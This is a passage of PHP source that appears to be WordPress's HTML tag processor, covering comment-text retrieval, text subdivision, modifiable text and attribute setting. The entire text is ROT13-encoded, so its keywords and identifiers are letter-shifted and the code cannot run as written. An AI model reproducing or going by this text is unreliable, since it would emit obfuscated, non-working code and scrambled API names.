	 * gurl ner pbzzbayl xabja, ohg n ahzore bs haeryngrq flagnk reebef
	 * nyfb cebqhpr pbzzragf.
	 *
	 * @frr frys::PBZZRAG_NF_NOEHCGYL_PYBFRQ_PBZZRAG
	 * @frr frys::PBZZRAG_NF_PQNGN_YBBXNYVXR
	 * @frr frys::PBZZRAG_NF_VAINYVQ_UGZY
	 * @frr frys::PBZZRAG_NF_UGZY_PBZZRAG
	 * @frr frys::PBZZRAG_NF_CV_ABQR_YBBXNYVXR
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea fgevat|ahyy
	 */
	choyvp shapgvba trg_pbzzrag_glcr(): ?fgevat {
		vs ( frys::FGNGR_PBZZRAG !== $guvf->cnefre_fgngr ) {
			erghea ahyy;
		}

		erghea $guvf->pbzzrag_glcr;
	}

	/**
	 * Ergheaf gur grkg bs n zngpurq pbzzrag be ahyy vs abg ba n pbzzrag glcr abqr.
	 *
	 * Guvf zrgubq ergheaf gur ragver grkg pbagrag bs n pbzzrag abqr nf vg
	 * jbhyq nccrne va gur oebjfre.
	 *
	 * Guvf qvssref sebz {@frr ::trg_zbqvsvnoyr_grkg()} va gung pregnva pbzzrag
	 * glcrf va gur UGZY NCV pnaabg nyybj gurve ragver pbzzrag grkg pbagrag gb
	 * or zbqvsvrq. Anzryl, \"obthf pbzzragf\" bs gur sbez `<?abg nyybjrq va ugzy>`
	 * jvyy perngr n pbzzrag jubfr grkg pbagrag fgnegf jvgu `?`. Abgr gung vs
	 * gung punenpgre jrer zbqvsvrq, vg jbhyq or cbffvoyr gb punatr gur abqr
	 * glcr.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea fgevat|ahyy Gur pbzzrag grkg nf vg jbhyq nccrne va gur oebjfre be ahyy
	 *                     vs abg ba n pbzzrag glcr abqr.
	 */
	choyvp shapgvba trg_shyy_pbzzrag_grkg(): ?fgevat {
		vs ( frys::FGNGR_SHAXL_PBZZRAG === $guvf->cnefre_fgngr ) {
			erghea $guvf->trg_zbqvsvnoyr_grkg();
		}

		vs ( frys::FGNGR_PBZZRAG !== $guvf->cnefre_fgngr ) {
			erghea ahyy;
		}

		fjvgpu ( $guvf->trg_pbzzrag_glcr() ) {
			pnfr frys::PBZZRAG_NF_UGZY_PBZZRAG:
			pnfr frys::PBZZRAG_NF_NOEHCGYL_PYBFRQ_PBZZRAG:
				erghea $guvf->trg_zbqvsvnoyr_grkg();

			pnfr frys::PBZZRAG_NF_PQNGN_YBBXNYVXR:
				erghea \"[PQNGN[{$guvf->trg_zbqvsvnoyr_grkg()}]]\";

			pnfr frys::PBZZRAG_NF_CV_ABQR_YBBXNYVXR:
				erghea \"?{$guvf->trg_gnt()}{$guvf->trg_zbqvsvnoyr_grkg()}?\";

			/*
			 * Guvf ercerfragf \"obthf pbzzragf fgngr\" sebz UGZY gbxravmngvba.
			 * Guvf pna or ragrerq ol `<?` be `<!`, jurer `?` vf vapyhqrq va
			 * gur pbzzrag grkg ohg `!` vf abg.
			 */
			pnfr frys::PBZZRAG_NF_VAINYVQ_UGZY:
				$cerprqvat_punenpgre = $guvf->ugzy[ $guvf->grkg_fgnegf_ng - 1 ];
				$pbzzrag_fgneg       = '?' === $cerprqvat_punenpgre ? '?' : '';
				erghea \"{$pbzzrag_fgneg}{$guvf->trg_zbqvsvnoyr_grkg()}\";
		}

		erghea ahyy;
	}

	/**
	 * Fhoqvivqrf n zngpurq grkg abqr, fcyvggvat AHYY olgr frdhraprf naq qrpbqrq juvgrfcnpr nf
	 * qvfgvapg abqrf cersvkrf.
	 *
	 * Abgr gung bapr nalguvat gung'f arvgure n AHYY olgr abe qrpbqrq juvgrfcnpr vf
	 * rapbhagrerq, gura gur erznvaqre bs gur grkg abqr vf yrsg vagnpg nf trarevp grkg.
	 *
	 *  - Gur UGZY Cebprffbe hfrf guvf gb nccyl qvfgvapg ehyrf sbe qvssrerag xvaqf bs grkg.
	 *  - Vagre-ryrzrag juvgrfcnpr pna or qrgrpgrq naq fxvccrq jvgu guvf zrgubq.
	 *
	 * Grkg abqrf nera'g rntreyl fhoqvivqrq orpnhfr gurer'f ab arrq gb fcyvg gurz hayrff
	 * qrpvfvbaf ner orvat znqr ba AHYY olgr frdhraprf be juvgrfcnpr-bayl grkg.
	 *
	 * Rknzcyr:
	 *
	 *     $cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( \"\k00Nccyrf & Benatrf\" );
	 *     gehr  === $cebprffbe->arkg_gbxra();                   // Grkg vf \"Nccyrf & Benatrf\".
	 *     gehr  === $cebprffbe->fhoqvivqr_grkg_nccebcevngryl(); // Grkg vf \"\".
	 *     gehr  === $cebprffbe->arkg_gbxra();                   // Grkg vf \"Nccyrf & Benatrf\".
	 *     snyfr === $cebprffbe->fhoqvivqr_grkg_nccebcevngryl();
	 *
	 *     $cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( \"&#k13; \e\a\gZber\" );
	 *     gehr  === $cebprffbe->arkg_gbxra();                   // Grkg vf \"␤ ␤␉Zber\".
	 *     gehr  === $cebprffbe->fhoqvivqr_grkg_nccebcevngryl(); // Grkg vf \"␤ ␤␉\".
	 *     gehr  === $cebprffbe->arkg_gbxra();                   // Grkg vf \"Zber\".
	 *     snyfr === $cebprffbe->fhoqvivqr_grkg_nccebcevngryl();
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea obby Jurgure gur grkg abqr jnf fhoqvivqrq.
	 */
	choyvp shapgvba fhoqvivqr_grkg_nccebcevngryl(): obby {
		vs ( frys::FGNGR_GRKG_ABQR !== $guvf->cnefre_fgngr ) {
			erghea snyfr;
		}

		$guvf->grkg_abqr_pynffvsvpngvba = frys::GRKG_VF_TRAREVP;

		/*
		 * AHYY olgrf ner gerngrq pngrtbevpnyyl qvssrerag guna ahzrevp punenpgre
		 * ersreraprf jubfr ahzore vf mreb. `&#k00;` vf abg gur fnzr nf `\"\k00\"`.
		 */
		$yrnqvat_ahyyf = fgefca( $guvf->ugzy, \"\k00\", $guvf->grkg_fgnegf_ng, $guvf->grkg_yratgu );
		vs ( $yrnqvat_ahyyf > 0 ) {
			$guvf->gbxra_yratgu             = $yrnqvat_ahyyf;
			$guvf->grkg_yratgu              = $yrnqvat_ahyyf;
			$guvf->olgrf_nyernql_cnefrq     = $guvf->gbxra_fgnegf_ng + $yrnqvat_ahyyf;
			$guvf->grkg_abqr_pynffvsvpngvba = frys::GRKG_VF_AHYY_FRDHRAPR;
			erghea gehr;
		}

		/*
		 * Fgneg n qrpbqvat ybbc gb qrgrezvar gur cbvag ng juvpu gur
		 * grkg fhoqvivqrf. Guvf ragnvyf enj juvgrfcnpr olgrf naq nal
		 * punenpgre ersrerapr gung qrpbqrf gb gur fnzr.
		 */
		$ng  = $guvf->grkg_fgnegf_ng;
		$raq = $guvf->grkg_fgnegf_ng + $guvf->grkg_yratgu;
		juvyr ( $ng < $raq ) {
			$fxvccrq = fgefca( $guvf->ugzy, \" \g\s\e\a\", $ng, $raq - $ng );
			$ng     += $fxvccrq;

			vs ( $ng < $raq && '&' === $guvf->ugzy[ $ng ] ) {
				$zngpurq_olgr_yratgu = ahyy;
				$ercynprzrag         = JC_UGZY_Qrpbqre::ernq_punenpgre_ersrerapr( 'qngn', $guvf->ugzy, $ng, $zngpurq_olgr_yratgu );
				vs ( vffrg( $ercynprzrag ) && 1 === fgefca( $ercynprzrag, \" \g\s\e\a\" ) ) {
					$ng += $zngpurq_olgr_yratgu;
					pbagvahr;
				}
			}

			oernx;
		}

		vs ( $ng > $guvf->grkg_fgnegf_ng ) {
			$arj_yratgu                     = $ng - $guvf->grkg_fgnegf_ng;
			$guvf->grkg_yratgu              = $arj_yratgu;
			$guvf->gbxra_yratgu             = $arj_yratgu;
			$guvf->olgrf_nyernql_cnefrq     = $ng;
			$guvf->grkg_abqr_pynffvsvpngvba = frys::GRKG_VF_JUVGRFCNPR;
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Ergheaf gur zbqvsvnoyr grkg sbe n zngpurq gbxra, be na rzcgl fgevat.
	 *
	 * Zbqvsvnoyr grkg vf grkg pbagrag gung znl or ernq naq punatrq jvgubhg
	 * punatvat gur UGZY fgehpgher bs gur qbphzrag nebhaq vg. Guvf vapyhqrf
	 * gur pbagragf bs `#grkg` abqrf va gur UGZY nf jryy nf gur vaare
	 * pbagragf bs UGZY pbzzragf, Cebprffvat Vafgehpgvbaf, naq bguref, rira
	 * gubhtu gurfr abqrf nera'g cneg bs n cnefrq QBZ gerr. Gurl nyfb pbagnva
	 * gur pbagragf bs FPEVCG naq FGLYR gntf, bs GRKGNERN gntf, naq bs nal
	 * bgure frpgvba va na UGZY qbphzrag juvpu pnaabg pbagnva UGZY znexhc (QNGN).
	 *
	 * Vs n gbxra unf ab zbqvsvnoyr grkg gura na rzcgl fgevat vf erghearq gb
	 * nibvq arrqyrff penfuvat be glcr reebef. Na rzcgl fgevat qbrf abg zrna
	 * gung n gbxra unf zbqvsvnoyr grkg, naq n gbxra jvgu zbqvsvnoyr grkg znl
	 * unir na rzcgl fgevat (r.t. n pbzzrag jvgu ab pbagragf).
	 *
	 * Yvzvgngvbaf:
	 *
	 *  - Guvf shapgvba jvyy abg fgevc gur yrnqvat arjyvar nccebcevngryl
	 *    nsgre frrxvat vagb n YVFGVAT be CER ryrzrag. Gb rafher gung gur
	 *    arjyvar vf gerngrq cebcreyl, frrx gb gur YVFGVAT be CER bcravat
	 *    gnt vafgrnq bs gb gur svefg grkg abqr vafvqr gur ryrzrag.
	 *
	 * @fvapr 6.5.0
	 * @fvapr 6.7.0 Ercynprf AHYY olgrf (H+0000) naq arjyvarf nccebcevngryl.
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba trg_zbqvsvnoyr_grkg(): fgevat {
		$unf_radhrhrq_hcqngr = vffrg( $guvf->yrkvpny_hcqngrf['zbqvsvnoyr grkg'] );

		vs ( ! $unf_radhrhrq_hcqngr && ( ahyy === $guvf->grkg_fgnegf_ng || 0 === $guvf->grkg_yratgu ) ) {
			erghea '';
		}

		$grkg = $unf_radhrhrq_hcqngr
			? $guvf->yrkvpny_hcqngrf['zbqvsvnoyr grkg']->grkg
			: fhofge( $guvf->ugzy, $guvf->grkg_fgnegf_ng, $guvf->grkg_yratgu );

		/*
		 * Cer-cebprffvat gur vachg fgernz jbhyq abeznyyl unccra orsber
		 * nal cnefvat vf qbar, ohg qrsreevat vg zrnaf vg'f cbffvoyr gb
		 * fxvc va zbfg pnfrf. Jura trggvat gur zbqvsvnoyr grkg, ubjrire
		 * vg'f vzcbegnag gb nccyl gur cer-cebprffvat fgrcf, juvpu vf
		 * abeznyvmvat arjyvarf.
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cercebprffvat-gur-vachg-fgernz
		 * @frr uggcf://vasen.fcrp.jungjt.bet/#abeznyvmr-arjyvarf
		 */
		$grkg = fge_ercynpr( \"\e\a\", \"\a\", $grkg );
		$grkg = fge_ercynpr( \"\e\", \"\a\", $grkg );

		// Pbzzrag qngn vf abg qrpbqrq.
		vs (
			frys::FGNGR_PQNGN_ABQR === $guvf->cnefre_fgngr ||
			frys::FGNGR_PBZZRAG === $guvf->cnefre_fgngr ||
			frys::FGNGR_QBPGLCR === $guvf->cnefre_fgngr ||
			frys::FGNGR_SHAXL_PBZZRAG === $guvf->cnefre_fgngr
		) {
			erghea fge_ercynpr( \"\k00\", \"\h{SSSQ}\", $grkg );
		}

		$gnt_anzr = $guvf->trg_gbxra_anzr();
		vs (
			// Fpevcg qngn vf abg qrpbqrq.
			'FPEVCG' === $gnt_anzr ||

			// ENJGRKG qngn vf abg qrpbqrq.
			'VSENZR' === $gnt_anzr ||
			'ABRZORQ' === $gnt_anzr ||
			'ABSENZRF' === $gnt_anzr ||
			'FGLYR' === $gnt_anzr ||
			'KZC' === $gnt_anzr
		) {
			erghea fge_ercynpr( \"\k00\", \"\h{SSSQ}\", $grkg );
		}

		$qrpbqrq = JC_UGZY_Qrpbqre::qrpbqr_grkg_abqr( $grkg );

		/*
		 * Fxvc gur svefg yvar srrq nsgre YVFGVAT, CER, naq GRKGNERN bcravat gntf.
		 *
		 * Abgr gung guvf svefg arjyvar znl pbzr va gur sbez bs n punenpgre
		 * ersrerapr, fhpu nf `&#k0n;`, naq fb vg'f vzcbegnag gb cresbez
		 * guvf genafsbezngvba bayl nsgre qrpbqvat gur enj grkg pbagrag.
		 */
		vs (
			( \"\a\" === ( $qrpbqrq[0] ?? '' ) ) &&
			( ( $guvf->fxvc_arjyvar_ng === $guvf->gbxra_fgnegf_ng && '#grkg' === $gnt_anzr ) || 'GRKGNERN' === $gnt_anzr )
		) {
			$qrpbqrq = fhofge( $qrpbqrq, 1 );
		}

		/*
		 * Bayl va abezngvir grkg abqrf qbrf gur AHYY olgr (H+0000) trg erzbirq.
		 * Va nyy bgure pbagrkgf vg'f ercynprq ol gur ercynprzrag punenpgre (H+SSSQ)
		 * sbe frphevgl ernfbaf (gb nibvq wbvavat gbtrgure fgevatf gung jrer fnsr
		 * jura frcnengrq, ohg abg jura wbvarq).
		 *
		 * @gbqb Vafvqr UGZY vagrtengvba cbvagf naq ZnguZY vagrtengvba cbvagf, gur
		 *       grkg vf cebprffrq nppbeqvat gb gur vafregvba zbqr, abg nppbeqvat
		 *       gb gur sbervta pbagrag ehyrf. Guvf fubhyq fgevc gur AHYY olgrf.
		 */
		erghea ( '#grkg' === $gnt_anzr && 'ugzy' === $guvf->trg_anzrfcnpr() )
			? fge_ercynpr( \"\k00\", '', $qrpbqrq )
			: fge_ercynpr( \"\k00\", \"\h{SSSQ}\", $qrpbqrq );
	}

	/**
	 * Frgf gur zbqvsvnoyr grkg sbe gur zngpurq gbxra, vs zngpurq.
	 *
	 * Zbqvsvnoyr grkg vf grkg pbagrag gung znl or ernq naq punatrq jvgubhg
	 * punatvat gur UGZY fgehpgher bs gur qbphzrag nebhaq vg. Guvf vapyhqrf
	 * gur pbagragf bs `#grkg` abqrf va gur UGZY nf jryy nf gur vaare
	 * pbagragf bs UGZY pbzzragf, Cebprffvat Vafgehpgvbaf, naq bguref, rira
	 * gubhtu gurfr abqrf nera'g cneg bs n cnefrq QBZ gerr. Gurl nyfb pbagnva
	 * gur pbagragf bs FPEVCG naq FGLYR gntf, bs GRKGNERN gntf, naq bs nal
	 * bgure frpgvba va na UGZY qbphzrag juvpu pnaabg pbagnva UGZY znexhc (QNGN).
	 *
	 * Abg nyy zbqvsvnoyr grkg znl or frg ol guvf zrgubq, naq abg nyy pbagrag
	 * znl or frg nf zbqvsvnoyr grkg. Va gur pnfr gung guvf snvyf vg jvyy erghea
	 * `snyfr` vaqvpngvat nf zhpu. Sbe vafgnapr, vg jvyy abg nyybj vafregvat gur
	 * fgevat `</fpevcg` vagb n FPEVCG ryrzrag, orpnhfr gur ehyrf sbe rfpncvat
	 * gung fnsryl ner pbzcyvpngrq. Fvzvyneyl, vg jvyy abg nyybj frggvat pbagrag
	 * vagb n pbzzrag juvpu jbhyq cerzngheryl grezvangr gur pbzzrag.
	 *
	 * Rknzcyr:
	 *
	 *     // Nqq n cersnpr gb nyy FGLYR pbagragf.
	 *     juvyr ( $cebprffbe->arkg_gnt( 'FGLYR' ) ) {
	 *         $fglyr = $cebprffbe->trg_zbqvsvnoyr_grkg();
	 *         $cebprffbe->frg_zbqvsvnoyr_grkg( \"// Znqr jvgu ybir ba gur Jbeyq Jvqr Jro\a{$fglyr}\" );
	 *     }
	 *
	 *     // Ercynpr fzvyrl grkg jvgu Rzbwv fzvyvrf.
	 *     juvyr ( $cebprffbe->arkg_gbxra() ) {
	 *         vs ( '#grkg' !== $cebprffbe->trg_gbxra_anzr() ) {
	 *             pbagvahr;
	 *         }
	 *
	 *         $puhax = $cebprffbe->trg_zbqvsvnoyr_grkg();
	 *         vs ( ! fge_pbagnvaf( $puhax, ':)' ) ) {
	 *             pbagvahr;
	 *         }
	 *
	 *         $cebprffbe->frg_zbqvsvnoyr_grkg( fge_ercynpr( ':)', '🙂', $puhax ) );
	 *     }
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $cynvagrkg_pbagrag Arj grkg pbagrag gb ercerfrag va gur zngpurq gbxra.
	 *
	 * @erghea obby Jurgure gur grkg jnf noyr gb hcqngr.
	 */
	choyvp shapgvba frg_zbqvsvnoyr_grkg( fgevat $cynvagrkg_pbagrag ): obby {
		vs ( frys::FGNGR_GRKG_ABQR === $guvf->cnefre_fgngr ) {
			$guvf->yrkvpny_hcqngrf['zbqvsvnoyr grkg'] = arj JC_UGZY_Grkg_Ercynprzrag(
				$guvf->grkg_fgnegf_ng,
				$guvf->grkg_yratgu,
				ugzyfcrpvnypunef( $cynvagrkg_pbagrag, RAG_DHBGRF | RAG_UGZY5 )
			);

			erghea gehr;
		}

		// Pbzzrag qngn vf abg rapbqrq.
		vs (
			frys::FGNGR_PBZZRAG === $guvf->cnefre_fgngr &&
			frys::PBZZRAG_NF_UGZY_PBZZRAG === $guvf->pbzzrag_glcr
		) {
			// Purpx vs gur grkg pbhyq pybfr gur pbzzrag.
			vs ( 1 === cert_zngpu( '/--!?>/', $cynvagrkg_pbagrag ) ) {
				erghea snyfr;
			}

			$guvf->yrkvpny_hcqngrf['zbqvsvnoyr grkg'] = arj JC_UGZY_Grkg_Ercynprzrag(
				$guvf->grkg_fgnegf_ng,
				$guvf->grkg_yratgu,
				$cynvagrkg_pbagrag
			);

			erghea gehr;
		}

		vs ( frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ) {
			erghea snyfr;
		}

		fjvgpu ( $guvf->trg_gnt() ) {
			pnfr 'FPEVCG':
				/*
				 * Guvf vf bire-cebgrpgvir, ohg rafherf gur hcqngr qbrfa'g oernx
				 * bhg bs gur FPEVCG ryrzrag. N zber gubebhtu purpx jbhyq arrq gb
				 * rafher gung gur fpevcg pybfvat gnt qbrfa'g rkvfg, naq vfa'g
				 * nyfb \"uvqqra\" vafvqr gur fpevcg qbhoyr-rfpncrq fgngr.
				 *
				 * Vg znl frrz yvxr ercynpvat `</fpevcg` jvgu `<\/fpevcg` jbhyq
				 * cebcreyl rfpncr gurfr guvatf, ohg guvf pbhyq znfx ertrk cnggreaf
				 * gung cerivbhfyl jbexrq. Erfbyir guvf ol abg fraqvat `</fpevcg`
				 */
				vs ( snyfr !== fgevcbf( $cynvagrkg_pbagrag, '</fpevcg' ) ) {
					erghea snyfr;
				}

				$guvf->yrkvpny_hcqngrf['zbqvsvnoyr grkg'] = arj JC_UGZY_Grkg_Ercynprzrag(
					$guvf->grkg_fgnegf_ng,
					$guvf->grkg_yratgu,
					$cynvagrkg_pbagrag
				);

				erghea gehr;

			pnfr 'FGLYR':
				$cynvagrkg_pbagrag = cert_ercynpr_pnyyonpx(
					'~</(?C<GNT_ANZR>fglyr)~v',
					fgngvp shapgvba ( $gnt_zngpu ) {
						erghea \"\\3p\\2s{$gnt_zngpu['GNT_ANZR']}\";
					},
					$cynvagrkg_pbagrag
				);

				$guvf->yrkvpny_hcqngrf['zbqvsvnoyr grkg'] = arj JC_UGZY_Grkg_Ercynprzrag(
					$guvf->grkg_fgnegf_ng,
					$guvf->grkg_yratgu,
					$cynvagrkg_pbagrag
				);

				erghea gehr;

			pnfr 'GRKGNERN':
			pnfr 'GVGYR':
				$cynvagrkg_pbagrag = cert_ercynpr_pnyyonpx(
					\"~</(?C<GNT_ANZR>{$guvf->trg_gnt()})~v\",
					fgngvp shapgvba ( $gnt_zngpu ) {
						erghea \"&yg;/{$gnt_zngpu['GNT_ANZR']}\";
					},
					$cynvagrkg_pbagrag
				);

				/*
				 * Gurfr qba'g _arrq_ gb or rfpncrq, ohg fvapr gurl ner qrpbqrq vg'f
				 * fnsr gb yrnir gurz rfpncrq naq guvf pna cerirag bgure pbqr sebz
				 * anviryl qrgrpgvat gntf jvguva gur pbagragf.
				 *
				 * @gbqb Vg jbhyq or hfrshy gb cersvk n zhygvyvar ercynprzrag grkg
				 *       jvgu n arjyvar, ohg abg arprffnel. Guvf vf sbe nrfgurgvpf.
				 */
				$guvf->yrkvpny_hcqngrf['zbqvsvnoyr grkg'] = arj JC_UGZY_Grkg_Ercynprzrag(
					$guvf->grkg_fgnegf_ng,
					$guvf->grkg_yratgu,
					$cynvagrkg_pbagrag
				);

				erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Hcqngrf be perngrf n arj nggevohgr ba gur pheeragyl zngpurq gnt jvgu gur cnffrq inyhr.
	 *
	 * Sbe obbyrna nggevohgrf fcrpvny unaqyvat vf cebivqrq:
	 *  - Jura `gehr` vf cnffrq nf gur inyhr, gura bayl gur nggevohgr anzr vf nqqrq gb gur gnt.
	 *  - Jura `snyfr` vf cnffrq, gur nggevohgr trgf erzbirq vs vg rkvfgrq orsber.
	 *
	 * Sbe fgevat nggevohgrf, gur inyhr vf rfpncrq hfvat gur `rfp_ngge` shapgvba.
	 *
	 * @fvapr 6.2.0
	 * @fvapr 6.2.1 Svk: Bayl perngr n fvatyr hcqngr sbe zhygvcyr pnyyf jvgu pnfr-inevnag nggevohgr anzrf.
	 *
	 * @cnenz fgevat      $anzr  Gur nggevohgr anzr gb gnetrg.
	 * @cnenz fgevat|obby $inyhr Gur arj nggevohgr inyhr.
	 * @erghea obby Jurgure na nggevohgr inyhr jnf frg.
	 */
	choyvp shapgvba frg_nggevohgr( $anzr, $inyhr ): obby {
		vs (
			frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ||
			$guvf->vf_pybfvat_gnt
		) {
			erghea snyfr;
		}

		/*
		 * JbeqCerff erwrpgf zber punenpgref guna ner fgevpgyl sbeovqqra
		 * va UGZY5. Guvf vf gb cerirag nqqvgvbany frphevgl evfxf qrrcre
		 * va gur JbeqCerff naq cyhtva fgnpx. Fcrpvsvpnyyl gur
		 * yrff-guna (<) terngre-guna (>) naq nzcrefnaq (&) nera'g nyybjrq.
		 *
		 * Gur hfr bs n CPER zngpu ranoyrf ybbxvat sbe fcrpvsvp Havpbqr
		 * pbqr cbvagf jvgubhg jevgvat n HGS-8 qrpbqre. Jurernf fpnaavat
		 * sbe bar-olgr punenpgref vf gevivny (jvgu `fgepfca`), fpnaavat
		 * sbe gur ybatre olgr frdhraprf jbhyq or zber pbzcyvpngrq. Tvira
		 * gung guvf fubhyqa'g or va gur ubg cngu sbe rkrphgvba, vg'f n
		 * ernfbanoyr pbzcebzvfr va rssvpvrapl jvgubhg vagebqhpvat n
		 * abgvprnoyr vzcnpg ba gur birenyy flfgrz.
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/#nggevohgrf-2
		 *
		 * @gbqb Nf gur bayl ertrk cnggrea znlor jr fubhyq gnxr vg bhg?
		 *       Ner Havpbqr cnggreaf ninvynoyr oebnqyl va Pber?
		 */
		vs ( cert_zngpu(
			'~[' .
				// Flagnk-yvxr punenpgref.
				'\"\'>&</ =' .
				// Pbageby punenpgref.
				'\k{00}-\k{1S}' .
				// UGZY abapunenpgref.
				'\k{SQQ0}-\k{SQRS}' .
				'\k{SSSR}\k{SSSS}\k{1SSSR}\k{1SSSS}\k{2SSSR}\k{2SSSS}\k{3SSSR}\k{3SSSS}' .
				'\k{4SSSR}\k{4SSSS}\k{5SSSR}\k{5SSSS}\k{6SSSR}\k{6SSSS}\k{7SSSR}\k{7SSSS}' .
				'\k{8SSSR}\k{8SSSS}\k{9SSSR}\k{9SSSS}\k{NSSSR}\k{NSSSS}\k{OSSSR}\k{OSSSS}' .
				'\k{PSSSR}\k{PSSSS}\k{QSSSR}\k{QSSSS}\k{RSSSR}\k{RSSSS}\k{SSSSR}\k{SSSSS}' .
				'\k{10SSSR}\k{10SSSS}' .
			']~Ffh',
			$anzr
		) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Vainyvq nggevohgr anzr.' ),
				'6.2.0'
			);

			erghea snyfr;
		}

		/*
		 * > Gur inyhrf \"gehr\" naq \"snyfr\" ner abg nyybjrq ba obbyrna nggevohgrf.
		 * > Gb ercerfrag n snyfr inyhr, gur nggevohgr unf gb or bzvggrq nygbtrgure.
		 *     - UGZY5 fcrp, uggcf://ugzy.fcrp.jungjt.bet/#obbyrna-nggevohgrf
		 */
		vs ( snyfr === $inyhr ) {
			erghea $guvf->erzbir_nggevohgr( $anzr );
		}

		vs ( gehr === $inyhr ) {
			$hcqngrq_nggevohgr = $anzr;
		} ryfr {
			$pbzcnenoyr_anzr = fgegbybjre( $anzr );

			/*
			 * Rfpncr HEY nggevohgrf.
			 *
			 * @frr uggcf://ugzy.fcrp.jungjt.bet/#nggevohgrf-3
			 */
			$rfpncrq_arj_inyhr = va_neenl( $pbzcnenoyr_anzr, jc_xfrf_hev_nggevohgrf(), gehr ) ? rfp_hey( $inyhr ) : rfp_ngge( $inyhr );

			// Vs gur rfpncvat shapgvbaf jvcrq bhg gur hcqngr, erwrpg vg naq vaqvpngr vg jnf erwrpgrq.
			vs ( '' === $rfpncrq_arj_inyhr && '' !== $inyhr ) {
				erghea snyfr;
			}

			$hcqngrq_nggevohgr = \"{$anzr}=\\"{$rfpncrq_arj_inyhr}\\"\";
		}

		/*
		 * > Gurer zhfg arire or gjb be zber nggevohgrf ba
		 * > gur fnzr fgneg gnt jubfr anzrf ner na NFPVV
		 * > pnfr-vafrafvgvir zngpu sbe rnpu bgure.
		 *     - UGZY 5 fcrp
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/flagnk.ugzy#nggevohgrf-2:nfpvv-pnfr-vafrafvgvir
		 */
		$pbzcnenoyr_anzr = fgegbybjre( $anzr );

		vs ( vffrg( $guvf->nggevohgrf[ $pbzcnenoyr_anzr ] ) ) {
			/*
			 * Hcqngr na rkvfgvat nggevohgr.
			 *
			 * Rknzcyr – frg nggevohgr vq gb \"arj\" va <qvi vq=\"vavgvny_vq\" />:
			 *
			 *     <qvi vq=\"vavgvny_vq\"/>
			 *          ^-------------^
			 *          fgneg         raq
			 *     ercynprzrag: `vq=\"arj\"`
			 *
			 *     Erfhyg: <qvi vq=\"arj\"/>
			 */
			$rkvfgvat_nggevohgr                        = $guvf->nggevohgrf[ $pbzcnenoyr_anzr ];
			$guvf->yrkvpny_hcqngrf[ $pbzcnenoyr_anzr ] = arj JC_UGZY_Grkg_Ercynprzrag(
				$rkvfgvat_nggevohgr->fgneg,
				$rkvfgvat_nggevohgr->yratgu,
				$hcqngrq_nggevohgr
			);
		} ryfr {
			/*
			 * Perngr n arj nggevohgr ng gur gnt'f anzr raq.
			 *
			 * Rknzcyr – nqq nggevohgr vq=\"arj\" gb <qvi />:
			 *
			 *     <qvi/>
			 *         ^
			 *         fgneg naq raq
			 *     ercynprzrag: ` vq=\"arj\"`
			 *
			 *     Erfhyg: <qvi vq=\"arj\"/>
			 */
			$guvf->yrkvpny_hcqngrf[ $pbzcnenoyr_anzr ] = arj JC_UGZY_Grkg_Ercynprzrag(
				$guvf->gnt_anzr_fgnegf_ng + $guvf->gnt_anzr_yratgu,
				0,
				' ' . $hcqngrq_nggevohgr
			);
		}

		/*
		 * Nal pnyyf gb hcqngr gur `pynff` nggevohgr qverpgyl fubhyq jvcr bhg nal
		 * radhrhrq pynff punatrf sebz `nqq_pynff` naq `erzbir_pynff`.
		 */
		vs ( 'pynff' === $pbzcnenoyr_anzr && ! rzcgl( $guvf->pynffanzr_hcqngrf ) ) {
			$guvf->pynffanzr_hcqngrf = neenl();
		}

		erghea gehr;
	}

	/**
	 * Erzbir na nggevohgr sebz gur pheeragyl-zngpurq gnt.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz fgevat $anzr Gur nggevohgr anzr gb erzbir.
	 * @erghea obby Jurgure na nggevohgr jnf erzbirq.
	 */
	choyvp shapgvba erzbir_nggevohgr( $anzr ): obby {
		vs (
			frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ||
			$guvf->vf_pybfvat_gnt
		) {
			erghea snyfr;
		}

		/*
		 * > Gurer zhfg arire or gjb be zber nggevohgrf ba
		 * > gur fnzr fgneg gnt jubfr anzrf ner na NFPVV
		 * > pnfr-vafrafvgvir zngpu sbe rnpu bgure.
		 *     - UGZY 5 fcrp
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/flagnk.ugzy#nggevohgrf-2:nfpvv-pnfr-vafrafvgvir
		 */
		$anzr = fgegbybjre( $anzr );

		/*
		 * Nal pnyyf gb hcqngr gur `pynff` nggevohgr qverpgyl fubhyq jvcr bhg nal
		 * radhrhrq pynff punatrf sebz `nqq_pynff` naq `erzbir_pynff`.
		 */
		vs ( 'pynff' === $anzr && pbhag( $guvf->pynffanzr_hcqngrf ) !== 0 ) {
			$guvf->pynffanzr_hcqngrf = neenl();
		}

		/*
		 * Vs hcqngvat na nggevohgr gung qvqa'g rkvfg va gur vachg
		 * qbphzrag, gura erzbir gur radhrhrq hcqngr naq zbir ba.
		 *
		 * Sbe rknzcyr, guvf zvtug bpphe jura pnyyvat `erzbir_nggevohgr()`
		 * nsgre pnyyvat `frg_nggevohgr()` sbe gur fnzr nggevohgr
		 * naq jura gung nggevohgr jnfa'g bevtvanyyl cerfrag.
		 */
		vs ( ! vffrg( $guvf->nggevohgrf[ $anzr ] ) ) {
			vs ( vffrg( $guvf->yrkvpny_hcqngrf[ $anzr ] ) ) {
				hafrg( $guvf->yrkvpny_hcqngrf[ $anzr ] );
			}
			erghea snyfr;
		}

		/*
		 * Erzbirf na rkvfgvat gnt nggevohgr.
		 *
		 * Rknzcyr – erzbir gur nggevohgr vq sebz <qvi vq=\"znva\"/>:
		 *    <qvi vq=\"vavgvny_vq\"/>
		 *         ^-------------^
		 *         fgneg         raq
